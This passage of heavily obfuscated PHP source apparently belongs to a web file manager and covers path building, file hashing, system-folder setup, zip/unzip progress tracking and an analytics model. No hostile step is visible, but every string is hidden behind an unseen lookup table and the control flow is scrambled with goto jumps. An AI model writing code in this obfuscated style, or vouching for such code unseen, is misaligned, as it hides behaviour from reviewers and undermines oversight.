clear($eŒ°ğÁî) { goto a˜£Åï‹ö¡; Fùªè¤æŠ: $c§ØˆÂÃÈ = $BÔÃç‡‘ËĞ[1143]; if (substr($eŒ°ğÁî, 0, 3) == $BÔÃç‡‘ËĞ[1144]) { $eŒ°ğÁî = substr($eŒ°ğÁî, 3); } while (strstr($eŒ°ğÁî, $c§ØˆÂÃÈ)) { $eŒ°ğÁî = str_replace($c§ØˆÂÃÈ, $BÔÃç‡‘ËĞ[8], $eŒ°ğÁî); } goto c¯Í§›ñçß; a˜£Åï‹ö¡: $BÔÃç‡‘ËĞ =& $_SERVER[Ïº«‚ßèÔˆø]; $eŒ°ğÁî = str_replace(array($BÔÃç‡‘ËĞ[1021], $BÔÃç‡‘ËĞ[228]), $BÔÃç‡‘ËĞ[50], $eŒ°ğÁî); $eŒ°ğÁî = str_replace($BÔÃç‡‘ËĞ[97], $BÔÃç‡‘ËĞ[8], $eŒ°ğÁî); goto Fùªè¤æŠ; c¯Í§›ñçß: $eŒ°ğÁî = preg_replace($BÔÃç‡‘ËĞ[1145], $BÔÃç‡‘ËĞ[8], $eŒ°ğÁî); if ($eŒ°ğÁî == $BÔÃç‡‘ËĞ[8]) { return $BÔÃç‡‘ËĞ[8]; } $eŒ°ğÁî = rtrim($eŒ°ğÁî, $BÔÃç‡‘ËĞ[8]); goto D‰§³‰‹¬ä; D‰§³‰‹¬ä: return $eŒ°ğÁî; goto aÌ½Ú˜ ØŒ; aÌ½Ú˜ ØŒ: } public static function sourceID($dË‘æËöš£) { $A¢ù²ƒ×›õ =& $_SERVER[Ïº«‚ßèÔˆø]; $eäÇ¾İÅ·Ô = self::parse($dË‘æËöš£); if ($eäÇ¾İÅ·Ô[$A¢ù²ƒ×›õ[29]] !== self::KOD_SOURCE) { show_json(LNG($A¢ù²ƒ×›õ[1146]), !1); } return $eäÇ¾İÅ·Ô[$A¢ù²ƒ×›õ[392]]; } public static function make($d¸çê²Á×Ş) { if (!$d¸çê²Á×Ş) { return !1; } return self::makePath(self::KOD_SOURCE, intval($d¸çê²Á×Ş)); } public static function makeShare($EĞµššó…¦, $A­˜òõÖÁ‰) { return self::makePath(self::KOD_SHARE_ITEM, $EĞµššó…¦, $A­˜òõÖÁ‰); } public static function makeFileTypePath($BÅÛÍ—ã¤î) { return self::makePath(self::KOD_USER_FILE_TYPE, $BÅÛÍ—ã¤î); } public static function makeFileTagPath($cˆÜ…¨¸Ùƒ) { return self::makePath(self::KOD_USER_FILE_TAG, $cˆÜ…¨¸Ùƒ); } public static function makePath($Eö»¯ƒŞƒ, $AŞÈùôÃº = '', $B‡éñß¬Ì— = '') { $Cê÷ÅÂøˆ÷ =& $_SERVER[Ïº«‚ßèÔˆø]; $c¿ÀÂî´Ø = substr($Eö»¯ƒŞƒ, 1, -1); $B¸¨¥…Ó°Œ = $Cê÷ÅÂøˆ÷[1147] . $c¿ÀÂî´Ø . $Cê÷ÅÂøˆ÷[1148] . $AŞÈùôÃº . $Cê÷ÅÂøˆ÷[1149]; $B¸¨¥…Ó°Œ = $B‡éñß¬Ì— ? $B¸¨¥…Ó°Œ . $B‡éñß¬Ì— . $Cê÷ÅÂøˆ÷[8] : $B¸¨¥…Ó°Œ; return $B¸¨¥…Ó°Œ; } public static function hashPath($e‹’½âò, $D¶´¥óÃ¼ˆ = true) { goto dë†éÙ©„; fÀÈŒÇâÃ³: return $dî¤–ˆ”‰³; goto FÂÌ¹Õ™¼; dë†éÙ©„: $EÍî§¬¯Ó· =& $_SERVER[Ïº«‚ßèÔˆø]; $eŞ†§™š = is_array($e‹’½âò) ? $e‹’½âò : IO::info($e‹’½âò); $dî¤–ˆ”‰³ = _get($eŞ†§™š, $EÍî§¬¯Ó·[1150], $EÍî§¬¯Ó·[33]); goto A›°¡Ş›„Ò; A›°¡Ş›„Ò: if (!$dî¤–ˆ”‰³ && isset($eŞ†§™š[$EÍî§¬¯Ó·[394]])) { $eŞ†§™š = IO::info(KodIO::make($eŞ†§™š[$EÍî§¬¯Ó·[394]])); $dî¤–ˆ”‰³ = _get($eŞ†§™š, $EÍî§¬¯Ó·[1150], $EÍî§¬¯Ó·[33]); } if (!$dî¤–ˆ”‰³ && $D¶´¥óÃ¼ˆ) { $A³æ›³“ = KodIO::parse($eŞ†§™š[$EÍî§¬¯Ó·[76]]); if (!$A³æ›³“[$EÍî§¬¯Ó·[29]]) { $dî¤–ˆ”‰³ = IO::hashSimple($eŞ†§™š[$EÍî§¬¯Ó·[76]]); } } if (!$dî¤–ˆ”‰³) { $dî¤–ˆ”‰³ = md5($eŞ†§™š[$EÍî§¬¯Ó·[76]] . $eŞ†§™š[$EÍî§¬¯Ó·[78]] . $eŞ†§™š[$EÍî§¬¯Ó·[84]]); } goto fÀÈŒÇâÃ³; FÂÌ¹Õ™¼: } public static function initSystemPath() { goto aè¦ÔæÒè; a„†ƒéÁ³´: IOHistory::bindEvent(); goto eÄÈï¯ˆÀÅ; aè¦ÔæÒè: $a±Áßš…¼ =& $_SERVER[Ïº«‚ßèÔˆø]; if (defined($a±Áßš…¼[1151])) { return; } define($a±Áßš…¼[1151], self::systemPath($a±Áßš…¼[1152])); goto AèÍ¸—¿Œ ; AèÍ¸—¿Œ : define($a±Áßš…¼[1153], self::systemPath($a±Áßš…¼[1154])); define($a±Áßš…¼[1155], self::systemPath($a±Áßš…¼[1156])); define($a±Áßš…¼[1157], self::systemPath($a±Áßš…¼[1158])); goto a„†ƒéÁ³´; eÄÈï¯ˆÀÅ: } public static function systemPath($F¼ÅºåØ…Ç) { goto b•Ì„¿®µ; d‘ÈÒ‰†Ûå: return $aôğäŸ¡; goto a†×ÊÄî; c„°°‡‚: if ($aôğäŸ¡) { return $aôğäŸ¡; } if ($F¼ÅºåØ…Ç == $AùÕÇÃ±ù­[1152]) { $aôğäŸ¡ = self::make(Model($AùÕÇÃ±ù­[782])->systemRootPathAdd($AùÕÇÃ±ù­[504])); } else { $aôğäŸ¡ = self::systemPath($AùÕÇÃ±ù­[1152]); $b±šöÁö· = self::sourceID($aôğäŸ¡); $aôğäŸ¡ = self::make(Model($AùÕÇÃ±ù­[782])->mkdir($b±šöÁö·, $F¼ÅºåØ…Ç)); } Model($AùÕÇÃ±ù­[714])->set($bÈ±‚³ø¤, $aôğäŸ¡); goto d‘ÈÒ‰†Ûå; b•Ì„¿®µ: $AùÕÇÃ±ù­ =& $_SERVER[Ïº«‚ßèÔˆø]; $bÈ±‚³ø¤ = $AùÕÇÃ±ù­[1159] . ucfirst($F¼ÅºåØ…Ç); $aôğäŸ¡ = Model($AùÕÇÃ±ù­[714])->get($bÈ±‚³ø¤); goto c„°°‡‚; a†×ÊÄî: } public static function systemFolder($DØ¨œö¾«) { $A²‡—–©ò³ = IO_PATH_SYSTEM_SOURCE . $DØ¨œö¾«; $D‹Ïáã²ÅÈ = Cache::get($A²‡—–©ò³); if (!$D‹Ïáã²ÅÈ) { $e‹ÔÜ±ùâù = IO::infoFull($A²‡—–©ò³); if (!$e‹ÔÜ±ùâù) { $D‹Ïáã²ÅÈ = IO::mkdir($A²‡—–©ò³, REPEAT_SKIP); } else { $D‹Ïáã²ÅÈ = $e‹ÔÜ±ùâù[$_SERVER[Ïº«‚ßèÔˆø][76]]; } Cache::set($A²‡—–©ò³, $D‹Ïáã²ÅÈ, 3600 * 10); } return $D‹Ïáã²ÅÈ; } public static function defaultDriver() { return Model($_SERVER[Ïº«‚ßèÔˆø][711])->defaultDriver(); } public static function defaultIO() { $a“×ÆåË¸ø =& $_SERVER[Ïº«‚ßèÔˆø]; $a¹Ğâ×“´ = self::defaultDriver(); return $a“×ÆåË¸ø[1160] . $a¹Ğâ×“´[$a“×ÆåË¸ø[392]] . $a“×ÆåË¸ø[1149]; } public static function defaultDriverInit() { static $a¦è†¾Ğø = false; if ($a¦è†¾Ğø) { return $a¦è†¾Ğø; } $a¦è†¾Ğø = IO::init(self::defaultIO()); return $a¦è†¾Ğø; } public static function fileTypeList() { $D°Ô§˜íèâ =& $_SERVER[Ïº«‚ßèÔˆø]; $D£‚É’¹Ü = $GLOBALS[$D°Ô§˜íèâ[6]][$D°Ô§˜íèâ[1161]]; foreach ($D£‚É’¹Ü as $cƒØÛƒË„‰ => $C‰ ÊâîÌİ) { $D¨­ã¶’ĞÇ = $D°Ô§˜íèâ[1162] . $cƒØÛƒË„‰; $a–Î­è¨æ¡ = LNG($D¨­ã¶’ĞÇ); if ($D¨­ã¶’ĞÇ != $a–Î­è¨æ¡) { $D£‚É’¹Ü[$cƒØÛƒË„‰][$D°Ô§˜íèâ[28]] = $a–Î­è¨æ¡; } } return $D£‚É’¹Ü; } public static function transferType($Dô¡ˆ‘Œ£‘, $AÇã®îÁ“–) { goto f¯ºéÑ÷‰; f¯ºéÑ÷‰: $BìÄ¡ğçŠ =& $_SERVER[Ïº«‚ßèÔˆø]; $bæƒÁ¦°‰ = self::driverType($Dô¡ˆ‘Œ£‘); $b÷‚¢ãÅÀ = self::driverType($AÇã®îÁ“–); goto Bœ„ÀÒàß; dª¼â”°Šè: return $BìÄ¡ğçŠ[1165]; goto D¡ÜÕ¸‹À‰; Bœ„ÀÒàß: if ($bæƒÁ¦°‰[$BìÄ¡ğçŠ[29]] == $b÷‚¢ãÅÀ[$BìÄ¡ğçŠ[29]] && $bæƒÁ¦°‰[$BìÄ¡ğçŠ[1163]] == $b÷‚¢ãÅÀ[$BìÄ¡ğçŠ[1163]]) { return $BìÄ¡ğçŠ[1164]; } if ($bæƒÁ¦°‰[$BìÄ¡ğçŠ[29]] == $BìÄ¡ğçŠ[816] && $b÷‚¢ãÅÀ[$BìÄ¡ğçŠ[29]] == $BìÄ¡ğçŠ[106]) { return $BìÄ¡ğçŠ[1077]; } if ($bæƒÁ¦°‰[$BìÄ¡ğçŠ[29]] == $BìÄ¡ğçŠ[106] && $b÷‚¢ãÅÀ[$BìÄ¡ğçŠ[29]] == $BìÄ¡ğçŠ[816]) { return $BìÄ¡ğçŠ[107]; } goto dª¼â”°Šè; D¡ÜÕ¸‹À‰: } public static function driverType($A»íë§Ş›) { goto e—ƒ¹¾§àÌ; B±İéäÃ…é: return array($d×«”‰Ø÷[29] => $d×«”‰Ø÷[816], $d×«”‰Ø÷[1163] => $A»íë§Ş›->pathDriver, $d×«”‰Ø÷[76] => $A»Ú«éî“¢); goto F±Õ®šë§ö; e—ƒ¹¾§àÌ: $d×«”‰Ø÷ =& $_SERVER[Ïº«‚ßèÔˆø]; $A»Ú«éî“¢ = $A»íë§Ş›->path; $fÅ‹ˆÅÔ‚ = str_replace($d×«”‰Ø÷[1166], $d×«”‰Ø÷[33], strtolower($A»íë§Ş›->getType())); goto f‘ğ®ñ“ï¨; f‘ğ®ñ“ï¨: if ($fÅ‹ˆÅÔ‚ == $d×«”‰Ø÷[702] || $fÅ‹ˆÅÔ‚ == $d×«”‰Ø÷[1167] || $fÅ‹ˆÅÔ‚ == $d×«”‰Ø÷[1168]) { $A»íë§Ş› = self::defaultDriverInit(); } else { if ($fÅ‹ˆÅÔ‚ == $d×«”‰Ø÷[1084] || $fÅ‹ˆÅÔ‚ == $d×«”‰Ø÷[1169]) { $A»íë§Ş› = IO::init($A»íë§Ş›->pathParse[$d×«”‰Ø÷[1031]]); } } $fÅ‹ˆÅÔ‚ = str_replace($d×«”‰Ø÷[1166], $d×«”‰Ø÷[33], strtolower($A»íë§Ş›->getType())); if ($fÅ‹ˆÅÔ‚ == $d×«”‰Ø÷[106]) { return array($d×«”‰Ø÷[29] => $d×«”‰Ø÷[106], $d×«”‰Ø÷[1163] => $d×«”‰Ø÷[33], $d×«”‰Ø÷[76] => $A»Ú«éî“¢); } goto B±İéäÃ…é; F±Õ®šë§ö: } } goto f¨ë‚¬Ğ·Ó; D‹ÂáÔŠ†: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto aë–ãİÄ˜Ÿ; fÃ‡”ÛßŒ°: if (!$c ÅÁ’™İ¦[$aùôåÃîæ˜[1414]]) { $c ÅÁ’™İ¦[$aùôåÃîæ˜[1414]] = LNG($aùôåÃîæ˜[1593]); } goto dô”‡„Ú«Á; aë–ãİÄ˜Ÿ: $aùôåÃîæ˜ =& $_SERVER[Ïº«‚ßèÔˆø]; parent::startAfter(); Hook::bind($aùôåÃîæ˜[1589], array($this, $aùôåÃîæ˜[1590])); goto b‘«¸ß£Àã; b‘«¸ß£Àã: Hook::bind($aùôåÃîæ˜[1072], array($this, $aùôåÃîæ˜[1591])); $c ÅÁ’™İ¦ =& $this->task; $c ÅÁ’™İ¦[$aùôåÃîæ˜[1592]] = $aùôåÃîæ˜[1077]; goto fÃ‡”ÛßŒ°; dô”‡„Ú«Á: } protected function endAfter() { $eÑÏ¯ãÍíÆ =& $_SERVER[Ïº«‚ßèÔˆø]; parent::endAfter(); Hook::unbind($eÑÏ¯ãÍíÆ[1589], array($this, $eÑÏ¯ãÍíÆ[1590])); Hook::unbind($eÑÏ¯ãÍíÆ[1072], array($this, $eÑÏ¯ãÍíÆ[1591])); } public function updateAfter() { $a¥—»Èëğ =& $_SERVER[Ïº«‚ßèÔˆø]; $a¦óÀÖÔãß =& $this->task; if (!$a¦óÀÖÔãß[$a¥—»Èëğ[1005]] || !$a¦óÀÖÔãß[$a¥—»Èëğ[707]]) { return; } if ($a¦óÀÖÔãß[$a¥—»Èëğ[1592]] == $a¥—»Èëğ[1077]) { $c©‹¥ó„Ü÷ = 0; if ($a¦óÀÖÔãß[$a¥—»Èëğ[1551]]) { $c©‹¥ó„Ü÷ = $a¦óÀÖÔãß[$a¥—»Èëğ[1552]] / $a¦óÀÖÔãß[$a¥—»Èëğ[1551]]; } $a¦óÀÖÔãß[$a¥—»Èëğ[1509]] = $c©‹¥ó„Ü÷ * 0.3; } else { if ($a¦óÀÖÔãß[$a¥—»Èëğ[1592]] == $a¥—»Èëğ[310]) { $c©‹¥ó„Ü÷ = $a¦óÀÖÔãß[$a¥—»Èëğ[1019]] / $a¦óÀÖÔãß[$a¥—»Èëğ[1005]]; $a¦óÀÖÔãß[$a¥—»Èëğ[1509]] = 0.3 + $c©‹¥ó„Ü÷ * 0.4; } else { if ($a¦óÀÖÔãß[$a¥—»Èëğ[1592]] == $a¥—»Èëğ[107]) { $C‰æø¹“˜´ = 0; if ($a¦óÀÖÔãß[$a¥—»Èëğ[1553]] == $a¥—»Èëğ[107]) { $C‰æø¹“˜´ = $a¦óÀÖÔãß[$a¥—»Èëğ[1552]]; } $c©‹¥ó„Ü÷ = ($a¦óÀÖÔãß[$a¥—»Èëğ[1556]] + $C‰æø¹“˜´) / $a¦óÀÖÔãß[$a¥—»Èëğ[707]]; $a¦óÀÖÔãß[$a¥—»Èëğ[1509]] = 0.3 + 0.4 + $c©‹¥ó„Ü÷ * 0.3; } } } if ($a¦óÀÖÔãß[$a¥—»Èëğ[1509]] > 0) { $a’¼¾²İ™ = timeFloat() - $a¦óÀÖÔãß[$a¥—»Èëğ[733]] - $a¦óÀÖÔãß[$a¥—»Èëğ[1512]]; $a¦óÀÖÔãß[$a¥—»Èëğ[1513]] = $a’¼¾²İ™ * (1 - $a¦óÀÖÔãß[$a¥—»Èëğ[1509]]) / $a¦óÀÖÔãß[$a¥—»Èëğ[1509]]; } } public function addFile($B ¡ëêº†ó) { goto aôô»³™ß±; Eä×ŒÚ±ÃÑ: $Cš²œé£±“[$Fíó„í‹ŒŠ[1549]] = $bÅ‰µé­—ò[$Fíó„í‹ŒŠ[28]]; $Cš²œé£±“[$Fíó„í‹ŒŠ[1551]] = $bÅ‰µé­—ò[$Fíó„í‹ŒŠ[78]]; $Cš²œé£±“[$Fíó„í‹ŒŠ[1552]] = 0; goto dŞ±«Ğƒğ±; dÎ½£²›ÒŞ: $Cš²œé£±“[$Fíó„í‹ŒŠ[1005]] = 1; $còÃ–Æ›É = 0; $Cš²œé£±“[$Fíó„í‹ŒŠ[1560]] = array($Fíó„í‹ŒŠ[1561] => $còÃ–Æ›É + 1, $Fíó„í‹ŒŠ[411] => $bÅ‰µé­—ò[$Fíó„í‹ŒŠ[28]], $Fíó„í‹ŒŠ[76] => $bÅ‰µé­—ò[$Fíó„í‹ŒŠ[76]], $Fíó„í‹ŒŠ[493] => $bÅ‰µé­—ò[$Fíó„í‹ŒŠ[493]] ? $bÅ‰µé­—ò[$Fíó„í‹ŒŠ[493]] : $bÅ‰µé­—ò[$Fíó„í‹ŒŠ[76]]); goto c¿ˆ…ÀÉØ‡; c¿ˆ…ÀÉØ‡: $this->update(); goto d¼ÆæùêÌÔ; aôô»³™ß±: $Fíó„í‹ŒŠ =& $_SERVER[Ïº«‚ßèÔˆø]; $Cš²œé£±“ =& $this->task; $bÅ‰µé­—ò = IO::info($B ¡ëêº†ó); goto Eä×ŒÚ±ÃÑ; dŞ±«Ğƒğ±: $Cš²œé£±“[$Fíó„í‹ŒŠ[1007]] = $Fíó„í‹ŒŠ[1568]; $Cš²œé£±“[$Fíó„í‹ŒŠ[1553]] = $Fíó„í‹ŒŠ[1077]; $Cš²œé£±“[$Fíó„í‹ŒŠ[707]] = $bÅ‰µé­—ò[$Fíó„í‹ŒŠ[78]]; goto dÎ½£²›ÒŞ; d¼ÆæùêÌÔ: } public function unzipAfter($b¼Ó©ÍŒæ) { goto BÌÔÜõ¬ò; cöİéğÑùÚ: if ($A±¨¹ö²­Ú[$D›ëœ÷ó‡[29]] == $D›ëœ÷ó‡[192]) { $B•ˆ¾Ì»—¾[$D›ëœ÷ó‡[1005]] = 1; } else { $B•ˆ¾Ì»—¾[$D›ëœ÷ó‡[1005]] = $A±¨¹ö²­Ú[$D›ëœ÷ó‡[81]][$D›ëœ÷ó‡[79]]; } $B•ˆ¾Ì»—¾[$D›ëœ÷ó‡[1007]] = $D›ëœ÷ó‡[33]; $B•ˆ¾Ì»—¾[$D›ëœ÷ó‡[1553]] = 0; goto D¿å†Ãß; dõá…¿æ: $B•ˆ¾Ì»—¾[$D›ëœ÷ó‡[1549]] = $D›ëœ÷ó‡[33]; $B•ˆ¾Ì»—¾[$D›ëœ÷ó‡[1556]] = 0; $B•ˆ¾Ì»—¾[$D›ëœ÷ó‡[707]] = $A±¨¹ö²­Ú[$D›ëœ÷ó‡[78]]; goto F³½æµéŠ; D¿å†Ãß: $B•ˆ¾Ì»—¾[$D›ëœ÷ó‡[1019]] = 0; $B•ˆ¾Ì»—¾[$D›ëœ÷ó‡[1551]] = 0; $B•ˆ¾Ì»—¾[$D›ëœ÷ó‡[1552]] = 0; goto dõá…¿æ; BÌÔÜõ¬ò: $D›ëœ÷ó‡ =& $_SERVER[Ïº«‚ßèÔˆø]; $B•ˆ¾Ì»—¾ =& $this->task; $B•ˆ¾Ì»—¾[$D›ëœ÷ó‡[1592]] = $D›ëœ÷ó‡[107]; goto fòº¢ñ’ºø; fòº¢ñ’ºø: $A±¨¹ö²­Ú = IO::infoWithChildren($b¼Ó©ÍŒæ); $fë¯‚ôÁğ = 0; $B•ˆ¾Ì»—¾[$D›ëœ÷ó‡[1560]] = array($D›ëœ÷ó‡[1561] => $fë¯‚ôÁğ + 1, $D›ëœ÷ó‡[411] => $A±¨¹ö²­Ú[$D›ëœ÷ó‡[28]], $D›ëœ÷ó‡[76] => $A±¨¹ö²­Ú[$D›ëœ÷ó‡[76]], $D›ëœ÷ó‡[493] => $A±¨¹ö²­Ú[$D›ëœ÷ó‡[493]] ? $A±¨¹ö²­Ú[$D›ëœ÷ó‡[493]] : $A±¨¹ö²­Ú[$D›ëœ÷ó‡[76]]); goto cöİéğÑùÚ; F³½æµéŠ: $this->update(); self::log($D›ëœ÷ó‡[1594] . json_encode(array($B•ˆ¾Ì»—¾, $A±¨¹ö²­Ú))); goto Dá¾¹Òö¦; Dá¾¹Òö¦: } public function nameParse($F½ƒÔïªºï) { goto a¨¢¼Š‘é°; a¨¢¼Š‘é°: $f“æª„––„ =& $_SERVER[Ïº«‚ßèÔˆø]; $bŠ°–Ïƒõœ =& $this->task; if ($bŠ°–Ïƒõœ[$f“æª„––„[1592]] == $f“æª„––„[1077]) { $bŠ°–Ïƒõœ[$f“æª„––„[1592]] = $f“æª„––„[310]; $bŠ°–Ïƒõœ[$f“æª„––„[1556]] = 0; $bŠ°–Ïƒõœ[$f“æª„––„[707]] = 0; } goto d§Ï‘œ’ß§; f‘×ÑŠŠ†: $this->update(); goto F¿…´’Ó’; d§Ï‘œ’ß§: $CÌŞä²Éö‘ = get_path_this($F½ƒÔïªºï); if (strstr($CÌŞä²Éö‘, $f“æª„––„[95])) { $bŠ°–Ïƒõœ[$f“æª„––„[1019]] += 1; $bŠ°–Ïƒõœ[$f“æª„––„[1005]] += 1; } $bŠ°–Ïƒõœ[$f“æª„––„[1549]] = $F½ƒÔïªºï; goto f‘×ÑŠŠ†; F¿…´’Ó’: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $EØº†Ø†ôÌ =& $_SERVER[Ïº«‚ßèÔˆø]; parent::startAfter(); Hook::bind($EØº†Ø†ôÌ[1595], array($this, $EØº†Ø†ôÌ[1590])); $dôÖ®…áÒ³ =& $this->task; $dôÖ®…áÒ³[$EØº†Ø†ôÌ[1592]] = $EØº†Ø†ôÌ[1077]; if (!$dôÖ®…áÒ³[$EØº†Ø†ôÌ[1414]]) { $dôÖ®…áÒ³[$EØº†Ø†ôÌ[1414]] = LNG($EØº†Ø†ôÌ[1596]); } } protected function endAfter() { $D×¡ƒ†¾² =& $_SERVER[Ïº«‚ßèÔˆø]; parent::endAfter(); Hook::unbind($D×¡ƒ†¾²[1595], array($this, $D×¡ƒ†¾²[1590])); } public function updateAfter() { $bœñŞ©ˆä =& $_SERVER[Ïº«‚ßèÔˆø]; $B‹Ä˜Øß° =& $this->task; if (!$B‹Ä˜Øß°[$bœñŞ©ˆä[1005]] || !$B‹Ä˜Øß°[$bœñŞ©ˆä[707]]) { return; } if ($B‹Ä˜Øß°[$bœñŞ©ˆä[1592]] == $bœñŞ©ˆä[1077]) { $b°À«†å„™ = $B‹Ä˜Øß°[$bœñŞ©ˆä[1552]]; if ($B‹Ä˜Øß°[$bœñŞ©ˆä[1553]] != $bœñŞ©ˆä[1077]) { $b°À«†å„™ = 0; } $BˆšÒ×ğ›œ = ($B‹Ä˜Øß°[$bœñŞ©ˆä[1556]] + $b°À«†å„™) / $B‹Ä˜Øß°[$bœñŞ©ˆä[707]]; $B‹Ä˜Øß°[$bœñŞ©ˆä[1509]] = $BˆšÒ×ğ›œ * 0.3; } else { if ($B‹Ä˜Øß°[$bœñŞ©ˆä[1592]] == $bœñŞ©ˆä[310]) { $BˆšÒ×ğ›œ = $B‹Ä˜Øß°[$bœñŞ©ˆä[1019]] / $B‹Ä˜Øß°[$bœñŞ©ˆä[1005]]; $B‹Ä˜Øß°[$bœñŞ©ˆä[1509]] = 0.3 + $BˆšÒ×ğ›œ * 0.5; } else { if ($B‹Ä˜Øß°[$bœñŞ©ˆä[1592]] == $bœñŞ©ˆä[107]) { $BˆšÒ×ğ›œ = 0; if ($B‹Ä˜Øß°[$bœñŞ©ˆä[1551]]) { $BˆšÒ×ğ›œ = $B‹Ä˜Øß°[$bœñŞ©ˆä[1552]] / $B‹Ä˜Øß°[$bœñŞ©ˆä[1551]]; } $B‹Ä˜Øß°[$bœñŞ©ˆä[1509]] = 0.3 + 0.5 + $BˆšÒ×ğ›œ * 0.2; } } } if ($B‹Ä˜Øß°[$bœñŞ©ˆä[1509]] > 0) { $Aõ§´ìÇñ– = timeFloat() - $B‹Ä˜Øß°[$bœñŞ©ˆä[733]] - $B‹Ä˜Øß°[$bœñŞ©ˆä[1512]]; $B‹Ä˜Øß°[$bœñŞ©ˆä[1513]] = $Aõ§´ìÇñ– * (1 - $B‹Ä˜Øß°[$bœñŞ©ˆä[1509]]) / $B‹Ä˜Øß°[$bœñŞ©ˆä[1509]]; } } public function copyFileStart($D­ã¦æ¦, $aï®Ú‘ƒåª, $b˜÷òĞå°ß, $fª‘‘¦ùùè, $f²¾Ï§ƒìº, $e˜±¿¸íùÛ) { $Fá¢ÅÑ‰ÌÃ =& $_SERVER[Ïº«‚ßèÔˆø]; parent::copyFileStart($D­ã¦æ¦, $aï®Ú‘ƒåª, $b˜÷òĞå°ß, $fª‘‘¦ùùè, $f²¾Ï§ƒìº, $e˜±¿¸íùÛ); $C°á›×´ä— =& $this->task; if ($C°á›×´ä—[$Fá¢ÅÑ‰ÌÃ[1592]] == $Fá¢ÅÑ‰ÌÃ[310]) { $C°á›×´ä—[$Fá¢ÅÑ‰ÌÃ[1592]] = $Fá¢ÅÑ‰ÌÃ[107]; } $this->update(); } public function copyFileEnd($d‡äæ†œ»†, $CíòÔñÆ¬î, $D…™À—«¶¦, $Fò³èÑÅÑ, $aùÍ³šñö­, $bœÁàÚÔò†) { $dŸÜà”Ñù =& $_SERVER[Ïº«‚ßèÔˆø]; $dß“ •ØØÇ =& $this->task; $dß“ •ØØÇ[$dŸÜà”Ñù[1552]] = $dß“ •ØØÇ[$dŸÜà”Ñù[1551]]; $dß“ •ØØÇ[$dŸÜà”Ñù[1556]] += $dß“ •ØØÇ[$dŸÜà”Ñù[1551]]; $dß“ •ØØÇ[$dŸÜà”Ñù[1553]] = $dŸÜà”Ñù[33]; $this->update(); } public function nameParse($CåİâÓ†–£) { $D¬ÙªøÇ =& $_SERVER[Ïº«‚ßèÔˆø]; $aã§ªöÇÉš =& $this->task; if ($aã§ªöÇÉš[$D¬ÙªøÇ[1019]] < $aã§ªöÇÉš[$D¬ÙªøÇ[1005]]) { $E¡Ê¾Ä›ŸÈ = get_path_this($CåİâÓ†–£); if (strstr($E¡Ê¾Ä›ŸÈ, $D¬ÙªøÇ[95])) { $aã§ªöÇÉš[$D¬ÙªøÇ[1019]] += 1; } } if ($aã§ªöÇÉš[$D¬ÙªøÇ[1592]] == $D¬ÙªøÇ[1077]) { $aã§ªöÇÉš[$D¬ÙªøÇ[1592]] = $D¬ÙªøÇ[310]; } $aã§ªöÇÉš[$D¬ÙªøÇ[1549]] = $CåİâÓ†–£; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($c‡ØƒÄÑ™×) { $F¤Ú¯åğ¬Í =& $_SERVER[Ïº«‚ßèÔˆø]; $cë¨½–³Ü = array($F¤Ú¯åğ¬Í[561] => array($F¤Ú¯åğ¬Í[29] => $F¤Ú¯åğ¬Í[1597], $F¤Ú¯åğ¬Í[270] => array($F¤Ú¯åğ¬Í[221], $F¤Ú¯åğ¬Í[709], $F¤Ú¯åğ¬Í[1598], $F¤Ú¯åğ¬Í[1599])), $F¤Ú¯åğ¬Í[1600] => array($F¤Ú¯åğ¬Í[29] => $F¤Ú¯åğ¬Í[1601], $F¤Ú¯åğ¬Í[270] => array($F¤Ú¯åğ¬Í[221], $F¤Ú¯åğ¬Í[707], $F¤Ú¯åğ¬Í[1602], $F¤Ú¯åğ¬Í[1603], $F¤Ú¯åğ¬Í[1604]))); if (!isset($cë¨½–³Ü[$c‡ØƒÄÑ™×])) { return !1; } $this->optionType = $cë¨½–³Ü[$c‡ØƒÄÑ™×][$F¤Ú¯åğ¬Í[29]]; $this->field = $cë¨½–³Ü[$c‡ØƒÄÑ™×][$F¤Ú¯åğ¬Í[270]]; return !0; } public function listData($EÒë«ëá™¸ = false, $f‹Äİ…ù¯ = "\155\x6f\x64\x69\x66\x79\x54\151\x6d\145", $F×î¨£è½Š = false) { return parent::listData($EÒë«ëá™¸, $f‹Äİ…ù¯, $F×î¨£è½Š); } public function trendList($cÌ»¿ÒËŠÜ) { goto B÷Õä’„æ; D»ÒçäÕƒ„: foreach ($a•í‡ãÈã¸ as $eÈÕ×ïë¹æ) { $this->{$bĞóµĞÖğ}($eÈÕ×ïë¹æ); } return $this->listData(); goto d‘½÷ î¹Ğ; e›•Íã²ôÁ: if (!isset($BÏíÔíÈ¼¶)) { $CØñ×Ç­¥ = $cÌ»¿ÒËŠÜ == $f—ˆêŒÊ¡Ş[561] ? $f—ˆêŒÊ¡Ş[505] : $f—ˆêŒÊ¡Ş[782]; $BÏíÔíÈ¼¶ = Model($CØñ×Ç­¥)->min($f—ˆêŒÊ¡Ş[193]); } $bĞóµĞÖğ = $f—ˆêŒÊ¡Ş[1607] . ucfirst($cÌ»¿ÒËŠÜ); $a•í‡ãÈã¸ = $this->dateList($BÏíÔíÈ¼¶); goto D»ÒçäÕƒ„; B÷Õä’„æ: $f—ˆêŒÊ¡Ş =& $_SERVER[Ïº«‚ßèÔˆø]; $F—ˆÈ”ˆ = $this->listData(); if ($F—ˆÈ”ˆ) { $EÆ˜„ÃÄˆ× = end($F—ˆÈ”ˆ); $eÈÕ×ïë¹æ = date($f—ˆêŒÊ¡Ş[1605], strtotime($f—ˆêŒÊ¡Ş[1606])); if ($EÆ˜„ÃÄˆ×[$f—ˆêŒÊ¡Ş[221]] == $eÈÕ×ïë¹æ) { return $F—ˆÈ”ˆ; } $BÏíÔíÈ¼¶ = strtotime($EÆ˜„ÃÄˆ×[$f—ˆêŒÊ¡Ş[221]]); } goto e›•Íã²ôÁ; d‘½÷ î¹Ğ: } private function dateList($DĞÁ›ÛÌ¸) { $cÑ ÒÍƒï =& $_SERVER[Ïº«‚ßèÔˆø]; $DåöïÁº¬Ö = $DĞÁ›ÛÌ¸; $AÖ‰Õª’© = strtotime($cÑ ÒÍƒï[1606]); $cÊïµ³®÷Ë = array(); while ($DåöïÁº¬Ö <= $AÖ‰Õª’©) { $cÊïµ³®÷Ë[] = date($cÑ ÒÍƒï[1605], $DåöïÁº¬Ö); $DåöïÁº¬Ö = strtotime($cÑ ÒÍƒï[1608], $DåöïÁº¬Ö); } return $cÊïµ³®÷Ë; } public function _recordUser($fœ…–îè²„ = '') { goto E‚˜Ú×‚Á£; F‹”º ê: 